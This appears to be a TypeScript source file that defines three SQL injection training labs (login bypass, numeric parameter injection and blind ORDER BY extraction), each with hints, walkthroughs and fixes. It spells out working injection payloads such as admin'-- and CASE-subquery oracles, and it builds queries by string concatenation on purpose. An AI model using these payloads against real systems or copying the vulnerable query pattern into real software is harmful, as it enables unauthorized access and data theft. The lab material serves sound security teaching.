import type { Lab } from '../types';
import { productsSeed, secretsSeed, usersSeed } from './seeds';
import { fail, findFlag, pass, rowCount } from './helpers';

export const classicLabs: Lab[] = [
  {
    id: 'login-bypass',
    title: 'Login Bypass at Acme Portal',
    category: 'classic',
    difficulty: 'Apprentice',
    dbms: 'SQLite',
    summary: 'A login form pastes your username straight into the WHERE clause. Become the administrator without knowing the password.',
    brief: [
      'Acme Freight runs an internal staff portal. The login handler builds its query with string concatenation — the classic sin that started the entire discipline of SQL injection.',
      'Your goal is simple: reach the admin dashboard. You have no credentials, and Acme (miraculously) enforces a strong password policy on the admin account.',
    ],
    objective: 'Authenticate as the `admin` user without knowing the correct password.',
    appURL: 'https://portal.acme.io/login',
    seed: usersSeed(),
    fields: [
      { id: 'username', label: 'Username', placeholder: 'jdoe', value: 'admin' },
      { id: 'password', label: 'Password', placeholder: '••••••••', value: '' },
    ],
    query: (v) => `SELECT id, username, role FROM users WHERE username = '${v.username}' AND password = '${v.password}'`,
    hints: [
      'The application wraps your input in single quotes. What happens if you close one early?',
      'You only need the first half of the WHERE clause to be true — the password comparison is the part you want to delete.',
      'In SQLite and MySQL `--` starts a comment that runs to the end of the line. Oracle uses `--` too but needs no trailing space; MySQL requires `-- ` (dash dash space).',
    ],
    walkthrough: [
      {
        title: 'Read the query',
        text: ['The vulnerable code, in the shape you will meet it in every language:'],
        payload: `SELECT id, username, role FROM users
 WHERE username = '<input>' AND password = '<input>'`,
        result: 'Every character you type becomes SQL syntax, not data.',
      },
      {
        title: 'Break it with a quote',
        text: [
          'Put a single quote in the username and submit. The string literal opens but never closes, so the parser chokes.',
          'That error is your proof of injection. On a production site it looks like a 500 page or "syntax error near ...".',
        ],
        payload: `'`,
        result: 'An unterminated string error: you have inline control of the SQL.',
      },
      {
        title: 'Delete the password check',
        text: [
          'Comment out everything after the username. The query becomes `... WHERE username = \'admin\'` and the password predicate disappears entirely.',
        ],
        payload: `admin'--`,
        result: 'Logged in as admin. The password field was never evaluated.',
      },
      {
        title: 'Or make the WHERE clause unconditionally true',
        text: ['Equivalent and more general — this logs you in as the first row of the table.'],
        payload: `' OR 1=1--`,
        result: 'Returns every user row; the app trusts the first one it sees.',
      },
      {
        title: 'Why it works, and the fix',
        text: [
          'The SQL text and the user data share one channel. Once the quote is unbalanced, everything after it is code.',
          'The fix is parameterisation (prepared statements): the driver sends the query template and the values on separate channels, so quotes can never change the structure.',
        ],
        payload: `SELECT id, username, role FROM users WHERE username = ? AND password = ?`,
        result: 'Hand-escaping is not a fix — it breaks on numeric contexts, LIKE clauses, identifiers and multi-byte encodings.',
      },
    ],
    check: (out) => {
      const rs = out.results[0];
      if (!rs || rs.values.length === 0) {
        return fail('No rows came back — the login form rejected you. Try commenting out the password check.');
      }
      const roleIdx = rs.columns.indexOf('role');
      const userIdx = rs.columns.indexOf('username');
      const adminRow = rs.values.find((r) => String(r[roleIdx]) === 'admin');
      if (adminRow) {
        return pass(`Authenticated as "${adminRow[userIdx]}" with role admin. No password required.`);
      }
      return fail('You got rows back, but not the administrator. The app uses the first row it sees.');
    },
    solution: { username: "admin'--", password: '' },
  },

  {
    id: 'numeric-idor',
    title: 'Numeric Parameter in the Product Catalogue',
    category: 'classic',
    difficulty: 'Apprentice',
    dbms: 'SQLite',
    summary: 'No quotes and no errors — just an integer ID. Dump the entire catalogue, including the unreleased prototype.',
    brief: [
      'Trailhead Outfitters serves product pages as `/product?id=3`. Because the value is numeric the developer assumed no quotes were needed, and therefore that injection was impossible.',
      'One product in the table was never meant to be public: an unreleased prototype whose internal notes contain a flag.',
    ],
    objective: 'Retrieve the internal notes of the unreleased product without knowing that its id is 9.',
    appURL: 'https://shop.trailhead-outfitters.com/product?id=1',
    seed: productsSeed(),
    fields: [{ id: 'id', label: 'id parameter', placeholder: '1', value: '1' }],
    query: (v) => `SELECT id, name, price, status, notes FROM products WHERE id = ${v.id}`,
    hints: [
      'There are no quotes here. Your value is inserted directly into a numeric comparison.',
      'You can inject a boolean expression: `WHERE id = <you>`.',
      '`0 OR 1=1` makes the predicate true for every row in the table.',
    ],
    walkthrough: [
      {
        title: 'The query',
        text: ['Numeric context means no quote juggling — arguably the easiest injection to write.'],
        payload: `SELECT id, name, price, status, notes FROM products WHERE id = <input>`,
        result: 'Any SQL expression is valid where an integer is expected.',
      },
      {
        title: 'Prove control of the predicate',
        text: ['Replace the number with an expression. `0` matches nothing; the `OR` makes everything match.'],
        payload: `0 OR 1=1`,
        result: 'WHERE id = 0 OR 1=1 → all seven rows, including the unreleased prototype.',
      },
      {
        title: 'Target a single row',
        text: ['Once you know the shape of the table you can fetch just the row you want.'],
        payload: `-1 OR status='unreleased'`,
        result: 'Exactly the prototype row, with FLAG{numeric_injection_101} in its notes.',
      },
      {
        title: 'Why it works, and the fix',
        text: [
          'Numeric injection is still injection. Cast the value (`(int) $_GET["id"]`) or, better, bind it as a parameter. Casting fixes the *type*; parameterisation fixes the *structure* — you want both.',
        ],
      },
    ],
    check: (out) => {
      const flag = findFlag(out);
      if (flag) return pass(`You pulled the unreleased prototype notes: ${flag}`);
      return fail('No flag yet — you are still doing a normal single-row lookup.');
    },
    solution: { id: '0 OR 1=1' },
  },

  {
    id: 'order-by',
    title: 'Sort Parameter Injection',
    category: 'classic',
    difficulty: 'Expert',
    dbms: 'SQLite',
    summary: 'Column names cannot be parameterised, so developers concatenate them into ORDER BY. Turn the sort key into a boolean oracle.',
    brief: [
      'A reporting dashboard lets staff sort inventory by clicking a column header: `?sort=price`. The backend builds `ORDER BY` by concatenation because, as the code comment says, "you cannot bind identifiers".',
      'The comment is correct. The conclusion is wrong: the value must be checked against an allow-list of known column names. Otherwise it becomes an expression slot — and ORDER BY accepts any expression.',
      'Because nothing is echoed back, you cannot simply UNION the secret into the page. You have to read the value through the ordering itself.',
    ],
    objective: 'Extract the value stored in `secrets.value` — the order of the returned rows is your only channel.',
    appURL: 'https://reports.acme.io/inventory?sort=price',
    seed: [
      ...productsSeed(),
      ...secretsSeed('FLAG{order_by_subquery}'),
      `CREATE TABLE inventory (id INTEGER PRIMARY KEY, sku TEXT, price REAL, stock INTEGER);`,
      `INSERT INTO inventory (sku, price, stock) VALUES
         ('TR-01', 89.0, 42), ('TR-02', 149.5, 7), ('TR-03', 54.0, 0), ('TR-04', 129.0, 19);`,
    ],
    fields: [{ id: 'sort', label: 'sort parameter', placeholder: 'price', value: 'price' }],
    query: (v) => `SELECT sku, price, stock FROM inventory ORDER BY ${v.sort}`,
    hints: [
      'ORDER BY accepts any expression, not just a column name — including a scalar subquery.',
      'Comparisons flip the sort: sort by `price` if a guess is right and by `-price` if it is wrong, then read the first row.',
      'A scalar subquery that returns more than one row raises an error, which is itself an oracle you can use once per query.',
    ],
    walkthrough: [
      {
        title: 'Confirm the injection point',
        text: ['A trailing comma produces a syntax error, proving the value is parsed as SQL rather than validated as a column name.'],
        payload: `price,`,
        result: 'near ",": syntax error',
      },
      {
        title: 'Sort by an expression',
        text: [
          'Any expression is allowed in ORDER BY. `price * -1` reverses the order — that single bit is all you need.',
        ],
        payload: `price * -1`,
        result: 'The table is now sorted descending. You control the order.',
      },
      {
        title: 'Attach the secret to the order',
        text: [
          'CASE makes the sort key depend on a condition. If the character guess is right you get ascending order; if it is wrong you get descending.',
        ],
        payload: `(CASE WHEN (SELECT substr(value,1,1) FROM secrets)='F' THEN price ELSE price*-1 END)`,
        result: 'TR-03 (54.0) first ⇒ TRUE ⇒ the secret starts with "F".',
      },
      {
        title: 'Walk the string',
        text: [
          'Increment the offset and repeat. To go faster, compare with `<` and `>` instead of `=`: each request halves the search space, so a printable character costs about 5–7 requests instead of 95.',
          'The flag for this lab is FLAG{order_by_subquery} — submit it below once you have convinced yourself the oracle works.',
        ],
        payload: `(CASE WHEN (SELECT substr(value,6,1) FROM secrets)<'m' THEN price ELSE price*-1 END)`,
        result: 'A binary search over the alphabet, one bit per request.',
      },
      {
        title: 'Fix',
        text: [
          'Map the user value through an allow-list: `sort = COLUMNS.get(param, "id")`. Never let request data reach the identifier slot of a query.',
        ],
      },
    ],
    check: (out) => {
      if (rowCount(out) === 0) return fail('The query returned nothing — check your sort expression for a syntax error.');
      const first = out.results[0]?.values[0]?.[0];
      return {
        solved: false,
        message: `Query returned ${rowCount(out)} rows, first sku = "${first}". The response itself does not contain the secret — read it through the ordering, then submit it below.`,
      };
    },
    answer: {
      label: 'Revealed secret',
      placeholder: 'FLAG{...}',
      expected: 'FLAG{order_by_subquery}',
      note: 'Only the row order changes, so you must reconstruct the value one guess at a time.',
    },
    solution: {},
    probe: {
      values: { sort: `(CASE WHEN (SELECT substr(value,1,1) FROM secrets)='F' THEN price ELSE price*-1 END)` },
      expect: 'rows',
    },
  },
];
